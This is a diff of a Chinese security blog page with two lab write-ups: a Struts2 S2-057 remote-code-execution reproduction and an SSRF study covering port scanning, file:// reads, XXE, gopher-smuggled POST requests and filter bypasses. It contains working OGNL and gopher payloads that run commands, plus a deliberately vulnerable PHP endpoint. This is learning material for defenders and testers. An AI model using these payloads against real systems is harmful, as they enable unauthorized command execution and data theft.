+        <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>前两天，又一波新的strauts2漏洞来袭，不知不觉已经到了057了，仍然是一个远程代码执行漏洞，危害巨大，然而限制也不小，对比045等漏洞来说，如果不是特殊配置，默认配置下可能不会造成该漏洞。</p>
+<h1 id="0x01-漏洞利用前提"><a href="#0x01-漏洞利用前提" class="headerlink" title="0x01 漏洞利用前提"></a>0x01 漏洞利用前提</h1><p>漏洞环境：docker vulhub</p>
+<p>struts2 配置前提：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alwaysSelectFullNamespace值为true</span><br><span class="line">struts2配置文件中，action元素未设置namespace属性，或使用通配符</span><br></pre></td></tr></table></figure>
+<p>测试存在漏洞poc</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&#123;233*233&#125; </span><br><span class="line">完整路径为http://www.xxx.com/struts2-showcase/$%7B233*233%7D/actionChain1.action</span><br></pre></td></tr></table></figure>
+<p>测试利用POC</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&#123;</span><br><span class="line">(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[&apos;struts.valueStack&apos;].context).(#cr=#ct[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec(&apos;id&apos;)).(@org.apache.commons.io.IOUtils@toString(#a.getInputStream()))&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="0x02-利用过程"><a href="#0x02-利用过程" class="headerlink" title="0x02 利用过程"></a>0x02 利用过程</h1><p>搭建好的docker渗透测试环境，先测试访问一下</p>
+<p><img src="\img\1535422803261.png" alt="1535422803261"></p>
+<p>利用测试漏洞poc来检测，使用burpsuite抓包即可</p>
+<p><img src="\img\1535422864702.png" alt="1535422864702"></p>
+<p>可以发现我们执行2*233被执行，结果在返回包中得到一个302跳转路径中目录出现466</p>
+<p>在利用漏洞利用poc</p>
+<p>如果直接在get请求中写入poc，发现无法使用</p>
+<p><img src="\img\1535423061159.png" alt="1535423061159"></p>
+<p>在这里本人测试中，必须要将所有的poc字符进行url编码，如果只用bp的编码key关键字符也是不行的</p>
+<p><img src="\img\1535423199481.png" alt="1535423199481"></p>
+<p><img src="\img\1535423245048.png" alt="1535423245048"></p>
+<p>当然如果是在别的地方利用url编码工具编码后的poc例如</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%24%7b</span><br><span class="line">(%23dm%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23ct%3d%23request%5b%27struts.valueStack%27%5d.context).(%23cr%3d%23ct%5b%27com.opensymphony.xwork2.ActionContext.container%27%5d).(%23ou%3d%23cr.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ou.getExcludedPackageNames().clear()).(%23ou.getExcludedClasses().clear()).(%23ct.setMemberAccess(%23dm)).(%23a%3d%40java.lang.Runtime%40getRuntime().exec(%27id%27)).(%40org.apache.commons.io.IOUtils%40toString(%23a.getInputStream()))%7d</span><br></pre></td></tr></table></figure>
+<p><img src="\img\1535423456489.png" alt="1535423456489"></p>
+<p>也是可以测试出来的，看来除了()符号外其他符号必须都编码才行</p>
+<h1 id="0x03-反弹shell"><a href="#0x03-反弹shell" class="headerlink" title="0x03 反弹shell"></a>0x03 反弹shell</h1><p>算了，先放着吧，没看到别人怎么反弹的，利用poc 自己构造的有问题</p>
+<h1 id="0x04-参考文章"><a href="#0x04-参考文章" class="headerlink" title="0x04 参考文章"></a>0x04 参考文章</h1><p><a href="https://mp.weixin.qq.com/s/iBLrrXHvs7agPywVW7TZrg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/iBLrrXHvs7agPywVW7TZrg</a></p>
+<p><a href="https://github.com/jas502n/St2-057" target="_blank" rel="noopener">https://github.com/jas502n/St2-057</a></p>
+<p><a href="https://github.com/Ivan1ee/struts2-057-exp" target="_blank" rel="noopener">https://github.com/Ivan1ee/struts2-057-exp</a></p>
+<p><a href="https://lgtm.com/blog/apache_struts_CVE-2018-11776" target="_blank" rel="noopener">https://lgtm.com/blog/apache_struts_CVE-2018-11776</a></p>
+<p><a href="https://github.com/vulhub/vulhub/tree/master/struts2" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/struts2</a></p>
 
       
 
@@ -279,11 +537,401 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">struts2 漏洞复现</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2018/08/15/hello-world/">展开全文 >></a>
+          <a class="article-more-a" href="/2018/08/28/struts2-057复现/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-SSRF简单学习总结" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/08/20/SSRF简单学习总结/">SSRF简单学习总结</a>
+    </h1>
+  
+
+        
+        <a href="/2018/08/20/SSRF简单学习总结/" class="archive-article-date">
+  	<time datetime="2018-08-20T08:48:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-20</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>笔者由于之前对于SSRF，仅仅处于科普阶段，目前在渗透测试中，也只遇到过一例weblogic的SSRF漏洞，当然可能是由于笔者对此不熟悉，导致没有发现有该漏洞的地方，因此决定痛改前非，整体学习一下SSRF。</p>
+<h1 id="0x01-SSRF概述"><a href="#0x01-SSRF概述" class="headerlink" title="0x01 SSRF概述"></a>0x01 SSRF概述</h1><p>SSRF 即服务器端请求伪造，利用该漏洞可以发起内网攻击，危害巨大，但是由于一般开发者仅仅对于比较常见的SQL注入，XSS等比较熟悉，因此在开发时，可能会疏忽对于SSRF漏洞的防御手段</p>
+<p>SSRF可以实现以下攻击效果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">内外网的端口及服务扫描</span><br><span class="line">内网主机敏感信息泄露</span><br><span class="line">通过HTTP的方式对内网web发起进攻，例如GET方式的sql注入，struts2漏洞，jboss漏洞等</span><br><span class="line">与XXE组成攻击链</span><br><span class="line">攻击内网程序，例如redis未授权</span><br><span class="line">利用file dict gopher协议读取内网本地信息</span><br></pre></td></tr></table></figure>
+<p>在这里可能有人会疑惑明明有可能是不同的协议，如果想去攻击非HTTP协议的怎么让不同的协议之间进行数据传输，这里就涉及到跨协议通信，这里简单介绍下，具体的参考<a href="http://www.freebuf.com/articles/web/19622.html" target="_blank" rel="noopener">跨协议通信</a></p>
+<p>跨协议通信，是指通过两种不同的协议可以交换指令和数据，其中一种叫做目标协议，另一种叫做载体协议，很冥想载体协议就是我们利用时写payload的协议，目标协议就是被攻击的协议，例如redis服务</p>
+<p>要想完成跨协议通信必须满足以下两点</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">目标协议必须要有很高的容错性  否则通过载体协议过去的指令无法执行</span><br><span class="line">载体协议能够封装目标协议的指令  如果不能封装，就无法写payload</span><br></pre></td></tr></table></figure>
+<h1 id="0x02-常见SSRF利用手段"><a href="#0x02-常见SSRF利用手段" class="headerlink" title="0x02 常见SSRF利用手段"></a>0x02 常见SSRF利用手段</h1><h2 id="0x0a-探索内网端口及服务"><a href="#0x0a-探索内网端口及服务" class="headerlink" title="0x0a 探索内网端口及服务"></a>0x0a 探索内网端口及服务</h2><p>  远程包含（本地包含）进行端口扫描，以bwapp渗透测试平台的环境为例，推荐下载owsap的靶机</p>
+<p>  配置完成虚拟机靶机后，物理机访问该靶机<a href="http://192.168.248.148/bWAPP/ssrf.php" target="_blank" rel="noopener">http://192.168.248.148/bWAPP/ssrf.php</a></p>
+<p><img src="\img\1534764437574.png" alt="bwapp"> </p>
+<p> 本小节只利用第一个任务，端口扫描，先获取一下官方的exp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;&lt;script&gt;alert(\&quot;U 4r3 0wn3d by MME!!!\&quot;);&lt;/script&gt;&quot;;</span><br><span class="line">if(isset($_REQUEST[&quot;ip&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">    //list of port numbers to scan</span><br><span class="line">    $ports = array(21, 22, 23, 25, 53, 80, 110, 1433, 3306);  //待扫描端口号</span><br><span class="line">    $results = array();</span><br><span class="line">    foreach($ports as $port)</span><br><span class="line">    &#123;</span><br><span class="line">        if($pf = @fsockopen($_REQUEST[&quot;ip&quot;], $port, $err, $err_string, 1))</span><br><span class="line">        &#123;</span><br><span class="line">            $results[$port] = true;</span><br><span class="line">            fclose($pf); </span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            $results[$port] = false;        </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    foreach($results as $port=&gt;$val)</span><br><span class="line">    &#123;</span><br><span class="line">        $prot = getservbyport($port,&quot;tcp&quot;);</span><br><span class="line">        echo &quot;Port $port ($prot): &quot;;</span><br><span class="line">        if($val)</span><br><span class="line">        &#123;</span><br><span class="line">            echo &quot;&lt;span style=\&quot;color:green\&quot;&gt;OK&lt;/span&gt;&lt;br/&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            echo &quot;&lt;span style=\&quot;color:red\&quot;&gt;Inaccessible&lt;/span&gt;&lt;br/&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p> 就是利用了socket连接来探测端口是否开启，这里对应的端口都是默认服务端口，例如FTP，常见默认端口就是21，但有时候别人会修改默认端口号，因此这里仅仅是大多数情况下，如果要想判断具体是什么服务，还是需要走指纹特征匹配才可以。</p>
+<p>这里我们配合bwapp的RFI/LFI即远程文件包含/本地文件包含，这也是一般SSRF经常利用的地方，我们将官方的exp包含进去，exp中是使用request的方式，即可以提交post的请求也可以提交get请求，但是为了看起来清晰，建议使用post，测试如下</p>
+<p><img src="\img\1534814513491.png" alt="1534814513491"></p>
+<h2 id="0x0b-敏感信息泄露"><a href="#0x0b-敏感信息泄露" class="headerlink" title="0x0b 敏感信息泄露"></a>0x0b 敏感信息泄露</h2><p>敏感信息泄露，即可以读取配置信息，敏感数据，包括系统配置信息，数据库配置信息，账号与密码等，搭建靶机，使用PHP作为搭建语言，直接借用官方教程给的curl实例改编一下即可当作一个环境</p>
+<p><img src="\img\1534816130523.png" alt="1534816130523"></p>
+<p>将固定url换为GET或POST请求得到的即可，因此搭建环境的代码为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 创建一个新cURL资源</span><br><span class="line">$ch = curl_init();</span><br><span class="line">// 设置URL和相应的选项</span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_GET[&apos;url&apos;]);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, false);</span><br><span class="line">// 抓取URL并把它传递给浏览器</span><br><span class="line">curl_exec($ch);</span><br><span class="line">//关闭cURL资源，并且释放系统资源</span><br><span class="line">curl_close($ch);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>可以使用PHP伪协议中的file协议读取本地敏感信息，为什么用file是由于file在php默认配置下即可使用，关于伪协议利用条件可以参考<a href="http://www.freebuf.com/column/148886.html" target="_blank" rel="noopener">伪协议</a>，简单构造一下payload，file:///C:windows/win.ini,读取windows系统配置文件，测试如下：</p>
+<p><img src="\img\1534816899993.png" alt="1534816899993"></p>
+<h2 id="0x0c-sql注入等常见GET方式注入"><a href="#0x0c-sql注入等常见GET方式注入" class="headerlink" title="0x0c sql注入等常见GET方式注入"></a>0x0c sql注入等常见GET方式注入</h2><p>SSRF不仅可以获取到敏感信息，还可以利用获取到的敏感信息中存在应用漏洞，如果是web服务，且可以利用GET方式，可以直接在利用参数后边构造利用代码</p>
+<p>例如sqli-labs中basic 2 整数注入</p>
+<p>常用测试语句为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/Less-2/index.php?id=1%20and%201=1--+  //返回登录成功信息</span><br><span class="line">http://127.0.0.1/sqli-labs/Less-2/index.php?id=1%20and%201=2--+  //不返回登录成功信息</span><br></pre></td></tr></table></figure>
+<p><img src="\img\1535448066233.png" alt="1535448066233"></p>
+<p><img src="\img\1535448047950.png" alt="1535448047950"></p>
+<p>利用上边的SSRF源代码</p>
+<p>构造的测试语句为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/ssrf/ssrf1.php?url=http://127.0.0.1/sqli-labs/Less-2/index.php?id=1%2520and%25201=1--+   //这里一定要注意在空格%20改为%2520 二次解码</span><br><span class="line">http://127.0.0.1/ssrf/ssrf1.php?url=http://127.0.0.1/sqli-labs/Less-2/index.php?id=1%2520and%25201=2--+</span><br></pre></td></tr></table></figure>
+<p>笔者尝试过不该为%2520的情况下失败，但是为啥%20不能利用成功，笔者猜测可能是由于首先我们ssrf要对url进行一次url解码，所以如果只构造一次的情况下，但构造成%2520时，ssrf解码一次后为%20，然后sql-libs又解码一次，于是就可以成功利用</p>
+<p><img src="\img\1535448427025.png" alt="1535448427025"></p>
+<p><img src="\img\1535448460798.png" alt="1535448460798"></p>
+<h1 id="0x03-高级SSRF利用"><a href="#0x03-高级SSRF利用" class="headerlink" title="0x03 高级SSRF利用"></a>0x03 高级SSRF利用</h1><h2 id="0x0a-XXE组合漏洞"><a href="#0x0a-XXE组合漏洞" class="headerlink" title="0x0a XXE组合漏洞"></a>0x0a XXE组合漏洞</h2><p>与XXE组合漏洞部分仍然使用bwapp来作为实例，涉及XXE的知识，会单独写一篇文章进行介绍</p>
+<p>首先在bwapp漏洞测试平台上获取一下xxe的利用代码，这个0x02第一节一样，访问<a href="http://192.168.248.148/bWAPP/ssrf.php" target="_blank" rel="noopener">http://192.168.248.148/bWAPP/ssrf.php</a></p>
+<p><img src="\img\1535427870571.png" alt="1535427870571"></p>
+<p>获取XXE利用脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># Accesses a file on the internal network (1)</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line"> &lt;!ENTITY bWAPP SYSTEM &quot;http://localhost/bWAPP/robots.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;reset&gt;&lt;login&gt;&amp;bWAPP;&lt;/login&gt;&lt;secret&gt;blah&lt;/secret&gt;&lt;/reset&gt;    //读取内部web服务的robots协议文件并回显，泄露内网服务的敏感路径信息</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Accesses a file on the internal network (2)</span><br><span class="line"># Web pages returns some characters that break the XML schema &gt; use the PHP base64 encoder filter to return an XML schema friendly version of the page!</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line"> &lt;!ENTITY bWAPP SYSTEM &quot;php://filter/read=convert.base64-encode/resource=http://localhost/bWAPP/passwords/heroes.xml&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;reset&gt;&lt;login&gt;&amp;bWAPP;&lt;/login&gt;&lt;secret&gt;blah&lt;/secret&gt;&lt;/reset&gt;   //利用php的伪协议使用base64来获取到敏感信息，为什么用base64是因为怕回显的内容中某些字符会被拦截</span><br></pre></td></tr></table></figure>
+<p>使用bwapp的xxe漏洞，访问<a href="http://192.168.248.148/bWAPP/xxe-1.php" target="_blank" rel="noopener">http://192.168.248.148/bWAPP/xxe-1.php</a></p>
+<p><img src="\img\1535428188666.png" alt="1535428188666"></p>
+<p>使用bp抓包查看，证明是标准的xxe漏洞</p>
+<p><img src="\img\1535428243984.png" alt="1535428243984"></p>
+<p>将官方的恶意XXE的exp祭出测试</p>
+<h2 id="0x0b-gopher协议应用"><a href="#0x0b-gopher协议应用" class="headerlink" title="0x0b gopher协议应用"></a>0x0b gopher协议应用</h2><p>gopher协议，是一个比http协议还古老的协议，早期就是用来替代现在http协议的，利用时有一定的局限性，例如php中并不会默认开启fopen的gopher wrapper，导致利用失败</p>
+<p>gopher协议在ssrf中绝对算得上是神之协议，可以利用gopher发送各种格式的请求包，这样就可以解决漏洞点不再GET参数的问题</p>
+<p>基本协议格式url: <strong>gopher://host:port/gopher-path</strong></p>
+<p>内网某应用存在危险函数可以直接命令执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">system($_POST[&apos;e&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>本地测试</p>
+<p><img src="\img\1535446369501.png" alt="1535446369501"></p>
+<p>抓包分析</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /ssrf/exp.php HTTP/1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">content-type: application/x-www-form-urlencoded</span><br><span class="line">cache: no-cache</span><br><span class="line">origin: moz-extension://17469fd6-16e2-41d4-a5b6-43f8784d26c2</span><br><span class="line">Content-Length: 8</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">e=whoami</span><br></pre></td></tr></table></figure>
+<p>使用gopher构造利用POC</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:80/_POST /ssrf/exp.php HTTP/1.1%250d%250aHost:127.0.0.1%250d%250aUser-Agent:%20Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0%250d%250aAccept: */*%250d%250aContent-Length: 8%250d%250aContent-Type: application/x-www-form-urlencoded%250d%250a%250d%250ae=whoami</span><br></pre></td></tr></table></figure>
+<p>hackbar走一波</p>
+<p><img src="\img\1535447478479.png" alt="1535447478479"></p>
+<p>完整的url为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/ssrf/ssrf1.php?url=gopher://127.0.0.1:80/_POST%20/ssrf/exp.php%20HTTP/1.1%250d%250aHost:127.0.0.1%250d%250aUser-Agent:%20Mozilla/5.0%20(Windows%20NT%2010.0;%20Win64;%20x64;%20rv:61.0)%20Gecko/20100101%20Firefox/61.0%250d%250aAccept:%20*/*%250d%250aContent-Length:%208%250d%250aContent-Type:%20application/x-www-form-urlencoded%250d%250a%250d%250ae=whoami</span><br></pre></td></tr></table></figure>
+<h2 id="0x0c-dict协议应用"><a href="#0x0c-dict协议应用" class="headerlink" title="0x0c dict协议应用"></a>0x0c dict协议应用</h2><p> dict协议是一个字典服务协议，在ssrf中可以用来探测内网服务信息，导致信息泄露</p>
+<p>举例：可以用来直接探索常见的应用信息例如试试ssh 22，ftp 21，mysql 3306 ,redis6739等</p>
+<p><img src="\img\1534818901576.png" alt="1534818901576"></p>
+<h2 id="0x0d-攻击内网服务漏洞redis"><a href="#0x0d-攻击内网服务漏洞redis" class="headerlink" title="0x0d 攻击内网服务漏洞redis"></a>0x0d 攻击内网服务漏洞redis</h2><h1 id="0x04-SSRF其他扩展"><a href="#0x04-SSRF其他扩展" class="headerlink" title="0x04 SSRF其他扩展"></a>0x04 SSRF其他扩展</h1><h2 id="0x0a-SSRF漏洞点"><a href="#0x0a-SSRF漏洞点" class="headerlink" title="0x0a SSRF漏洞点"></a>0x0a SSRF漏洞点</h2><p>漏洞点通常存在在以下几点</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">从WEB功能上寻找</span><br><span class="line">    通过URL分享内容</span><br><span class="line">    文件处理、编码处理、转码等服务</span><br><span class="line">    在线翻译</span><br><span class="line">    通过URL地址加载与下载图片</span><br><span class="line">    图片、文章的收藏</span><br><span class="line">    设置邮件接收服务器</span><br><span class="line">从URL关键字寻找</span><br><span class="line">    share、wap、url、link、src、source、target、u、3g、</span><br><span class="line">    display、sourceURl、imageURL、domain...</span><br></pre></td></tr></table></figure>
+<h2 id="0x0b-SSRF漏洞验证"><a href="#0x0b-SSRF漏洞验证" class="headerlink" title="0x0b SSRF漏洞验证"></a>0x0b SSRF漏洞验证</h2><p>基本验证方式</p>
+<p>例如：某豆瓣存在某个service接口可以访问image图片</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.douban.com/***/service?image=http://www.baidu.com/img/bd_logo1.png</span><br></pre></td></tr></table></figure>
+<p>验证思路</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">若右键新窗口打开图片，如果链接为http://www.baidu.com/img/bd_logo1.png，则证明不存在</span><br><span class="line">F12查看网络请求，如果不存在http://www.baidu.com/img/bd_logo1.png,如果不存在这条请求，则证明存在</span><br></pre></td></tr></table></figure>
+<h2 id="0x0c-SSRF绕过"><a href="#0x0c-SSRF绕过" class="headerlink" title="0x0c SSRF绕过"></a>0x0c SSRF绕过</h2><p>ssrf利用时有时候会遇到IP限制，可以利用以下几点来绕过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">* 使用@：http://A.com@10.10.10.10 = 10.10.10.10</span><br><span class="line">* IP地址转换成十进制、八进制：127.0.0.1 = 2130706433</span><br><span class="line">* 使用短地址：http://10.10.116.11 = http://t.cn/RwbLKDx</span><br><span class="line">* 端口绕过：ip后面加一个端口</span><br><span class="line">* xip.io：10.0.0.1.xip.io = 10.0.0.1</span><br><span class="line">        www.10.0.0.1.xip.io = 10.0.0.1</span><br><span class="line">        mysite.10.0.0.1.xip.io = 10.0.0.1</span><br><span class="line">        foo.bar.10.0.0.1.xip.io = 10.0.0.1</span><br><span class="line">* 通过js跳转</span><br></pre></td></tr></table></figure>
+<h2 id="0x0d-经典SSRF漏洞"><a href="#0x0d-经典SSRF漏洞" class="headerlink" title="0x0d 经典SSRF漏洞"></a>0x0d 经典SSRF漏洞</h2><p>  FFmpeg 的SSRF本地敏感信息泄露漏洞（CVE-2016-1897）<a href="http://www.freebuf.com/column/142775.html" target="_blank" rel="noopener">详情</a></p>
+<p> weblogic的SSRF漏洞<a href="https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf" target="_blank" rel="noopener">详情</a></p>
+<h1 id="0x05-参考资料"><a href="#0x05-参考资料" class="headerlink" title="0x05 参考资料"></a>0x05 参考资料</h1><p><a href="http://doc.redisfans.com/topic/protocol.html" target="_blank" rel="noopener">http://doc.redisfans.com/topic/protocol.html</a></p>
+<p><a href="http://www.freebuf.com/articles/web/19622.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/19622.html</a></p>
+<p><a href="http://www.freebuf.com/column/157466.html" target="_blank" rel="noopener">http://www.freebuf.com/column/157466.html</a></p>
+<p><a href="https://blog.chaitin.cn/gopher-attack-surfaces/" target="_blank" rel="noopener">https://blog.chaitin.cn/gopher-attack-surfaces/</a></p>
+<p><a href="https://www.jianshu.com/p/ad7b8079e0d5" target="_blank" rel="noopener">https://www.jianshu.com/p/ad7b8079e0d5</a></p>
+<p><a href="https://www.secpulse.com/archives/4747.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/4747.html</a></p>
+<p><a href="https://uknowsec.cn/posts/notes/SSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html" target="_blank" rel="noopener">https://uknowsec.cn/posts/notes/SSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">SSRF WEB安全</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/08/20/SSRF简单学习总结/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-常见windows隐藏文件方式总结" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
